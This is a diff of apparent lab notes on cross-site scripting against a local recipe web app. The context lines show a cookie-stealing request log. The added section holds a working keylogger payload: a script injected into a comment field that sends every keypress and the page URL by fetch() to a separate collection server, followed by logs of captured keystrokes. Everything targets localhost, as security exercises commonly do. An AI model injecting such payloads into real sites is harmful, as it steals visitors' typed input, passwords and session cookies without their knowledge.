@@ -12,3 +12,26 @@ XSS cookie
 python -m http.server 8000
 -->::ffff:127.0.0.1 - - [18/Nov/2025 08:18:03] "GET /steal?cookie=username=admin HTTP/1.1" 404 -
 
+KEYLOGGER
+
+<input type="text" placeholder="Dein Kommentar..." style="width:100%; padding:10px; margin:10px 0;">
+<script>
+document.addEventListener('keypress', function(e) {
+    fetch('http://127.0.0.1:8000/log?key=' + encodeURIComponent(e.key) + '&url=' + encodeURIComponent(window.location.href));
+});
+</script>
+
+python keylogger_server.py
+-->
+127.0.0.1 - - [18/Nov/2025 08:27:32] "GET /log?key=o&url=http://127.0.0.1:5000/rezept/10 HTTP/1.1" 204 -
+H
+127.0.0.1 - - [18/Nov/2025 08:30:05] "GET /log?key=H&url=http://127.0.0.1:5000/rezept/11 HTTP/1.1" 204 -
+a
+127.0.0.1 - - [18/Nov/2025 08:30:05] "GET /log?key=a&url=http://127.0.0.1:5000/rezept/11 HTTP/1.1" 204 -
+l
+127.0.0.1 - - [18/Nov/2025 08:30:05] "GET /log?key=l&url=http://127.0.0.1:5000/rezept/11 HTTP/1.1" 204 -
+l
+127.0.0.1 - - [18/Nov/2025 08:30:05] "GET /log?key=l&url=http://127.0.0.1:5000/rezept/11 HTTP/1.1" 204 -
+o
+127.0.0.1 - - [18/Nov/2025 08:30:05] "GET /log?key=o&url=http://127.0.0.1:5000/rezept/11 HTTP/1.1" 204 -
+Enter
